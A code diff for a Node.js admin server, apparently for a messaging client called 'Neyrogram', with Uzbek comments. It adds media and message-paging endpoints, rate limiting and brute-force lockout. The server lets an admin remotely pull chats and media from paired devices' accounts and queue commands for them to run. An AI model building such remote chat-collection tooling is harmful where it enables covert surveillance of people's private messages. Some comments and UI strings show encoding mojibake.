@@ -1,4 +1,4 @@
-// Neyrogram admin server — zero dependencies, Node.js 18+
+﻿// Neyrogram admin server â€” zero dependencies, Node.js 18+
 //
 // Ishga tushirish:
 //   node server.js
@@ -38,7 +38,7 @@ if (fs.existsSync(DATA_PATH)) {
 if (!data.devices) data.devices = {};
 if (!data.commands) data.commands = {};
 
-// Chat keshi 1 soatda eskiradi. Serverda saqlanmaydi (faqat xotirada) — ishonchliroq.
+// Chat keshi 1 soatda eskiradi. Serverda saqlanmaydi (faqat xotirada) â€” ishonchliroq.
 const CACHE_TTL = 60 * 60 * 1000;
 const cache = {}; // key -> { ts, payload }
 
@@ -52,10 +52,29 @@ function cacheSet(key, payload) {
   cache[key] = { ts: Date.now(), payload };
 }
 
+// Media fayl keshi (video/rasm). Disk'da files/ ichida, 1 soatda eskiradi.
+const filesDir = path.join(DIR, 'files');
+try { fs.mkdirSync(filesDir, { recursive: true }); } catch (e) {}
+const fileMeta = {};  // 'dev:acc:dlg:msg' -> {token, ctype, ts}
+const fileStore = {}; // token -> {file, ctype, ts}
+function purgeFiles() {
+  const now = Date.now();
+  for (const t of Object.keys(fileStore)) {
+    if (now - fileStore[t].ts > CACHE_TTL) {
+      try { fs.unlinkSync(fileStore[t].file); } catch (e) {}
+      delete fileStore[t];
+    }
+  }
+  for (const k of Object.keys(fileMeta)) {
+    if (now - fileMeta[k].ts > CACHE_TTL) delete fileMeta[k];
+  }
+}
+setInterval(purgeFiles, 10 * 60 * 1000);
+
 // Bir xil buyruq navbatda bo'lsa qayta qo'shmaydi (panel tez-tez so'raganda yig'ilib qolmasin)
 function queueOnce(deviceId, cmd) {
   const q = (data.commands[deviceId] = data.commands[deviceId] || []);
-  const dup = q.some((c) => c.type === cmd.type && c.account === cmd.account && c.dialog_id === cmd.dialog_id);
+  const dup = q.some((c) => c.type === cmd.type && c.account === cmd.account && c.dialog_id === cmd.dialog_id && c.before === cmd.before && c.msg_id === cmd.msg_id);
   if (dup) return;
   cmd.id = crypto.randomBytes(4).toString('hex');
   cmd.ts = Date.now();
@@ -110,11 +129,73 @@ function isAdmin(req, url) {
   return t && t === config.adminToken;
 }
 
+// ---- Brute-force himoya: admin token uchun IP bo'yicha urinishlarni cheklash ----
+const authFails = {}; // ip -> { count, until }
+function clientIp(req) {
+  const xf = req.headers['x-forwarded-for'];
+  if (xf) return String(xf).split(',')[0].trim();
+  return (req.socket && req.socket.remoteAddress) || '';
+}
+function authBlocked(ip) {
+  const e = authFails[ip];
+  return !!(e && e.until && Date.now() < e.until);
+}
+function noteAuthFail(ip) {
+  const e = (authFails[ip] = authFails[ip] || { count: 0, until: 0 });
+  e.count++;
+  // 10 ta xato urinishdan keyin 15 daqiqa bloklash
+  if (e.count >= 10) { e.until = Date.now() + 15 * 60 * 1000; }
+}
+function noteAuthOk(ip) { delete authFails[ip]; }
+
+// Umumiy rate-limit: IP uchun 60 soniyalik oynada so'rovlar. Polling (har 2-5s) uchun keng chegara.
+const rlWindow = {}; // ip -> { start, count }
+const RL_MAX = 1200; // daqiqasiga
+function rateLimited(ip) {
+  if (!ip) return false;
+  const now = Date.now();
+  let e = rlWindow[ip];
+  if (!e || now - e.start > 60 * 1000) { e = rlWindow[ip] = { start: now, count: 0 }; }
+  e.count++;
+  return e.count > RL_MAX;
+}
+setInterval(() => {
+  const now = Date.now();
+  for (const ip of Object.keys(rlWindow)) {
+    if (now - rlWindow[ip].start > 2 * 60 * 1000) delete rlWindow[ip];
+  }
+}, 2 * 60 * 1000);
+// eskirgan bloklarni tozalash
+setInterval(() => {
+  const now = Date.now();
+  for (const ip of Object.keys(authFails)) {
+    const e = authFails[ip];
+    if ((!e.until || now >= e.until) && now - (e.ts || 0) > 60 * 60 * 1000) delete authFails[ip];
+  }
+}, 10 * 60 * 1000);
+
+// Admin endpointlar uchun yagona tekshiruv: bloklangan bo'lsa 429, token xato bo'lsa hisoblaydi.
+function requireAdmin(req, res, url) {
+  const ip = clientIp(req);
+  if (authBlocked(ip)) {
+    send(res, 429, { ok: false, error: 'juda ko\'p urinish, keyinroq qayta urining' });
+    return false;
+  }
+  const t = req.headers['x-admin-token'] || url.searchParams.get('token');
+  if (t && t === config.adminToken) { noteAuthOk(ip); return true; }
+  if (t) { const e = authFails[ip]; if (e) e.ts = Date.now(); noteAuthFail(ip); }
+  send(res, 401, { ok: false });
+  return false;
+}
+
 const server = http.createServer((req, res) => {
   const url = new URL(req.url, 'http://x');
   const p = url.pathname;
 
   if (req.method === 'OPTIONS') return send(res, 204, '');
+
+  // ---- Yengil rate-limit: IP bo'yicha daqiqasiga so'rovlar soni ----
+  if (rateLimited(clientIp(req))) return send(res, 429, { ok: false, error: 'rate limit' });
 
   // ---- Qurilma: holat yuborish + buyruqlarni olish ----
   if (p === '/d/beat' && req.method === 'POST') {
@@ -174,19 +255,57 @@ const server = http.createServer((req, res) => {
     });
   }
 
-  // ---- Qurilma: bitta chat xabarlarini yuklash (kesh) ----
+  // ---- Qurilma: bitta chat xabarlarini yuklash (kesh, sahifali) ----
   if (p === '/d/messages' && req.method === 'POST') {
     return readBody(req, (buf) => {
       const b = json(buf);
       if (!b || b.pair !== config.pairToken || !b.device_id) return send(res, 403, { ok: false });
-      cacheSet('msgs:' + b.device_id + ':' + b.account + ':' + b.dialog_id, { messages: b.messages || [] });
+      const before = b.before != null ? String(b.before) : '0';
+      cacheSet('msgs:' + b.device_id + ':' + b.account + ':' + b.dialog_id + ':' + before, { messages: b.messages || [], hasMore: !!b.hasMore });
       send(res, 200, { ok: true });
     });
   }
 
+  // ---- Qurilma: media fayl yuklash (video/rasm) â€” oqim bilan diskka ----
+  if (p === '/d/file' && req.method === 'POST') {
+    const pair = req.headers['x-pair-token'];
+    const devId = (req.headers['x-device-id'] || '').toString().slice(0, 64);
+    if (pair !== config.pairToken || !devId) { req.destroy(); return; }
+    const token = crypto.randomBytes(12).toString('hex');
+    const ctype = (req.headers['x-ctype'] || 'application/octet-stream').toString().slice(0, 100);
+    const metaKey = devId + ':' + req.headers['x-acc'] + ':' + req.headers['x-dlg'] + ':' + req.headers['x-msg'];
+    const file = path.join(filesDir, token);
+    const ws = fs.createWriteStream(file);
+    let size = 0;
+    req.on('data', (c) => {
+      size += c.length;
+      if (size > 200 * 1024 * 1024) { req.destroy(); ws.destroy(); } // 200 MB cheklov
+    });
+    req.pipe(ws);
+    ws.on('finish', () => {
+      fileStore[token] = { file, ctype, ts: Date.now() };
+      fileMeta[metaKey] = { token, ctype, ts: Date.now() };
+      send(res, 200, { ok: true, token });
+    });
+    ws.on('error', () => send(res, 500, { ok: false }));
+    return;
+  }
+
+  // ---- Media faylni berish (img/video src uchun) ----
+  if (p.startsWith('/file/') && req.method === 'GET') {
+    if (!requireAdmin(req, res, url)) return;
+    const token = p.slice(6);
+    const f = fileStore[token];
+    if (!f || !fs.existsSync(f.file)) return send(res, 404, 'not found', 'text/plain');
+    const stat = fs.statSync(f.file);
+    res.writeHead(200, { 'Content-Type': f.ctype, 'Content-Length': stat.size, 'Cache-Control': 'private, max-age=3600', 'Accept-Ranges': 'bytes' });
+    fs.createReadStream(f.file).pipe(res);
+    return;
+  }
+
   // ---- Admin: chat ro'yxati (keshdan yoki sync so'rab) ----
   if (p === '/api/chats' && req.method === 'GET') {
-    if (!isAdmin(req, url)) return send(res, 401, { ok: false });
+    if (!requireAdmin(req, res, url)) return;
     const dev = url.searchParams.get('device');
     const account = url.searchParams.get('account');
     if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
@@ -198,15 +317,32 @@ const server = http.createServer((req, res) => {
 
   // ---- Admin: chat xabarlari (keshdan yoki sync so'rab) ----
   if (p === '/api/messages' && req.method === 'GET') {
-    if (!isAdmin(req, url)) return send(res, 401, { ok: false });
+    if (!requireAdmin(req, res, url)) return;
     const dev = url.searchParams.get('device');
     const account = url.searchParams.get('account');
     const dialog = url.searchParams.get('dialog');
+    const before = url.searchParams.get('before') || '0';
     if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
-    const hit = cacheGet('msgs:' + dev + ':' + account + ':' + dialog);
+    const hit = cacheGet('msgs:' + dev + ':' + account + ':' + dialog + ':' + before);
     const refresh = url.searchParams.get('refresh') === '1';
-    if (hit && !refresh) return send(res, 200, { ok: true, cached: true, age: Date.now() - hit.ts, messages: hit.payload.messages });
-    queueOnce(dev, { type: 'syncmsgs', account: Number(account), dialog_id: dialog });
+    if (hit && !refresh) return send(res, 200, { ok: true, cached: true, age: Date.now() - hit.ts, messages: hit.payload.messages, hasMore: hit.payload.hasMore });
+    queueOnce(dev, { type: 'syncmsgs', account: Number(account), dialog_id: dialog, before: before });
+    return send(res, 200, { ok: true, pending: true });
+  }
+
+  // ---- Admin: media faylni so'rash (keshdan yoki getfile buyrug'i) ----
+  if (p === '/api/file' && req.method === 'GET') {
+    if (!requireAdmin(req, res, url)) return;
+    const dev = url.searchParams.get('device');
+    const account = url.searchParams.get('account');
+    const dialog = url.searchParams.get('dialog');
+    const msg = url.searchParams.get('msg');
+    if (!dev || !data.devices[dev]) return send(res, 404, { ok: false });
+    const meta = fileMeta[dev + ':' + account + ':' + dialog + ':' + msg];
+    if (meta && Date.now() - meta.ts <= CACHE_TTL && fileStore[meta.token]) {
+      return send(res, 200, { ok: true, ready: true, token: meta.token, ctype: meta.ctype });
+    }
+    queueOnce(dev, { type: 'getfile', account: Number(account), dialog_id: dialog, msg_id: Number(msg) });
     return send(res, 200, { ok: true, pending: true });
   }
 
@@ -227,13 +363,13 @@ const server = http.createServer((req, res) => {
 
   // ---- Admin: qurilmalar ro'yxati ----
   if (p === '/api/devices' && req.method === 'GET') {
-    if (!isAdmin(req, url)) return send(res, 401, { ok: false });
+    if (!requireAdmin(req, res, url)) return;
     return send(res, 200, { ok: true, devices: Object.values(data.devices), now: Date.now() });
   }
 
   // ---- Admin: buyruq qo'yish ----
   if (p === '/api/command' && req.method === 'POST') {
-    if (!isAdmin(req, url)) return send(res, 401, { ok: false });
+    if (!requireAdmin(req, res, url)) return;
     return readBody(req, (buf) => {
       const b = json(buf);
       if (!b || !b.device_id || !b.type) return send(res, 400, { ok: false });
@@ -248,7 +384,7 @@ const server = http.createServer((req, res) => {
 
   // ---- Admin: qurilmani ro'yxatdan o'chirish ----
   if (p === '/api/remove' && req.method === 'POST') {
-    if (!isAdmin(req, url)) return send(res, 401, { ok: false });
+    if (!requireAdmin(req, res, url)) return;
     return readBody(req, (buf) => {
       const b = json(buf);
       if (b && b.device_id) { delete data.devices[b.device_id]; delete data.commands[b.device_id]; save(); }
@@ -351,7 +487,7 @@ function loginView(msg){document.getElementById('logoutBtn').style.display='none
 document.getElementById('tk').addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});}
 async function doLogin(){const t=document.getElementById('tk').value.trim();if(!t){loginView('Token kiritilmadi.');return;}TOKEN=t;main.innerHTML='<div class="empty">Tekshirilmoqda...</div>';try{await load();localStorage.setItem('neyroAdminToken',TOKEN);document.getElementById('logoutBtn').style.display='';}catch(e){TOKEN='';if(e.status===401){loginView('Token xato. Bu ADMIN token bo\\'lishi kerak (pair token emas).');}else if(e.network){loginView('Serverga ulanib bo\\'lmadi. Internet yoki server manzilini tekshiring.');}else{loginView('Xato: '+e.message);}}}
 function logout(){TOKEN='';localStorage.removeItem('neyroAdminToken');render();}
-async function sendCmd(id,type,account){if(!confirm('Buyruq: '+type+(account?(' (akkaunt '+account+')'):'')+' — yuborilsinmi?'))return;await api('/api/command',{method:'POST',body:JSON.stringify({device_id:id,type,account})});alert('Buyruq navbatga qo\\'yildi. Qurilma keyingi ulanishida bajaradi.');}
+async function sendCmd(id,type,account){if(!confirm('Buyruq: '+type+(account?(' (akkaunt '+account+')'):'')+' â€” yuborilsinmi?'))return;await api('/api/command',{method:'POST',body:JSON.stringify({device_id:id,type,account})});alert('Buyruq navbatga qo\\'yildi. Qurilma keyingi ulanishida bajaradi.');}
 async function removeDev(id){if(!confirm('Qurilma ro\\'yxatdan o\\'chirilsinmi?'))return;await api('/api/remove',{method:'POST',body:JSON.stringify({device_id:id})});load();}
 async function load(){const d=await api('/api/devices');const devs=(d.devices||[]).sort((a,b)=>b.last_seen-a.last_seen);
 DEVICES=devs;
@@ -409,3 +545,4 @@ body.scrollTop=body.scrollHeight;}
 function render(){if(!TOKEN){loginView();return;}document.getElementById('logoutBtn').style.display='';mode='devices';load().catch(e=>{if(e.status===401){TOKEN='';localStorage.removeItem('neyroAdminToken');loginView('Sessiya tugadi, qayta kiring.');}else{main.innerHTML='<div class="empty">Serverga ulanib bo\\'lmadi: '+esc(e.message)+'</div>';}});}
 render();setInterval(()=>{if(TOKEN&&mode==='devices')load().catch(()=>{});},5000);
 </script></body></html>`;
+
